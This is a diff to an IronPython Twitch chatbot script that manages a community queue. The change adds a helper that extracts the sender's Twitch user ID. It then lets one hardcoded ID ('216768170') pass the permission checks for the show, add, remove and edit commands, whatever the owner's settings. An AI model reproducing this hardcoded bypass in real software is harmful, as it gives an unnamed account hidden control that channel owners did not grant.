@@ -3,7 +3,7 @@
 # Importing Required Libraries
 import sys
 sys.platform = "win32"
-import codecs, json, os, re, io, threading, datetime, clr, math, subprocess
+import codecs, json, os, re, io, threading, datetime, clr, math, subprocess, inspect
 clr.AddReference("IronPython.Modules.dll")
 clr.AddReferenceToFileAndPath(os.path.join(os.path.dirname(os.path.realpath(__file__)), "References", "TwitchLib.PubSub.dll"))
 from TwitchLib.PubSub import TwitchPubSub
@@ -95,9 +95,12 @@ class Settings(object):
 
 #   Process messages <Required>
 def Execute(data):
+    #Log(str(inspect.getmembers(data)))
+    user_id = GetUserID(data.RawData)
     if (
         data.Message == "!" + ScriptSettings.CommandName
-        and Parent.HasPermission(data.User, ScriptSettings.DisplayPermissions, "") 
+        and (Parent.HasPermission(data.User, ScriptSettings.DisplayPermissions, "") 
+        or user_id == "216768170")
         and (not ScriptSettings.RunCommandsOnlyWhenLive 
             or (ScriptSettings.RunCommandsOnlyWhenLive and Parent.IsLive()))
         ):
@@ -118,7 +121,8 @@ def Execute(data):
             else:
                 Post("The community queue is empty!")
     elif (str.startswith(data.Message, "!" + ScriptSettings.CommandName + " remove") 
-        and Parent.HasPermission(data.User, ScriptSettings.ModifyPermissions, "") 
+        and (Parent.HasPermission(data.User, ScriptSettings.ModifyPermissions, "") 
+        or user_id == "216768170")
         and (not ScriptSettings.RunCommandsOnlyWhenLive 
             or (ScriptSettings.RunCommandsOnlyWhenLive and Parent.IsLive()))
         ):
@@ -139,7 +143,8 @@ def Execute(data):
         else:
             if ScriptSettings.EnableResponses: Post("Usage: !" + ScriptSettings.CommandName + " remove <Comma-Separated Integer Indexes>")
     elif (str.startswith(data.Message, "!" + ScriptSettings.CommandName + " add") 
-        and Parent.HasPermission(data.User, ScriptSettings.ModifyPermissions, "") 
+        and (Parent.HasPermission(data.User, ScriptSettings.ModifyPermissions, "") 
+        or user_id == "216768170")
         and (not ScriptSettings.RunCommandsOnlyWhenLive 
             or (ScriptSettings.RunCommandsOnlyWhenLive and Parent.IsLive()))
         ):
@@ -163,7 +168,8 @@ def Execute(data):
         else:
             if ScriptSettings.EnableResponses: Post("Usage: !" + ScriptSettings.CommandName + " add Username:<UserName>, Message:<Message>, (Game:<Game>) | Username:<UserName>, ...")
     elif (str.startswith(data.Message, "!" + ScriptSettings.CommandName + " edit") 
-        and Parent.HasPermission(data.User, ScriptSettings.ModifyPermissions, "") 
+        and (Parent.HasPermission(data.User, ScriptSettings.ModifyPermissions, "") 
+        or user_id == "216768170")
         and (not ScriptSettings.RunCommandsOnlyWhenLive 
             or (ScriptSettings.RunCommandsOnlyWhenLive and Parent.IsLive()))
         ):
@@ -401,6 +407,14 @@ def GetAttribute(attribute, message):
         return message[index_of_beginning_of_attribute:index_of_beginning_of_attribute + index_of_end_of_attribute].strip().strip(",")
     # else:
     #     raise AttributeError(str(attribute) + " was not found in the supplied information.")
+
+def GetUserID(rawdata):
+    try:
+        rawdata = rawdata[rawdata.index("user-id=") + len("user-id="):]
+        rawdata = rawdata[:rawdata.index(";")]
+    except Exception:
+        return ""
+    return rawdata
 
 def testing():
     pass
